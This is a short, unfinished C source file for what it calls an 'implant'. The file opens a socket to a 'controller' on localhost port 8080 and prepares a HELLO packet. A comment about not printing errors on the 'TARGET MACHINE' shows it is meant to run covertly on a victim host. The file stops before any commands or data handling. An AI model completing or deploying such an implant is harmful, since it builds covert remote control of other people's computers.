#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>

#include "protocol.h"

int main(int argc, char **argv)
{

    int implant_fd = socket(AF_INET, SOCK_STREAM, 0);

    if (implant_fd < 1)
    {
        perror("socket"); // fix this, we do not want to print an error on the TARGET MACHINE
        return 0;
    }

    struct sockaddr_in controller_ip_structure;

    memset(&controller_ip_structure, 0, sizeof(controller_ip_structure));
    controller_ip_structure.sin_family = AF_INET;
    controller_ip_structure.sin_port = htons(8080);

    const char *CONTROLLER_IP_ADDR = "127.0.0.1";

    if (inet_pton(AF_INET, CONTROLLER_IP_ADDR, &controller_ip_structure.sin_addr) <= 0)
    {

        perror("inet_pton");
        close(implant_fd);
        return 0;
    }

    if ((connect(implant_fd, (struct sockaddr *)&controller_ip_structure, sizeof(controller_ip_structure))) < 0)
    {
        perror("send");
        close(implant_fd);
        return 0;
    }

    printf("<Succesfully connected to Controller!\n");

    printf("Sending HELLO");

    Packet initial_hello = {COMMAND_HELLO,0,0, NULL};

    













    





    //close(implant_fd); // get rid of this after testing

    return 0;
}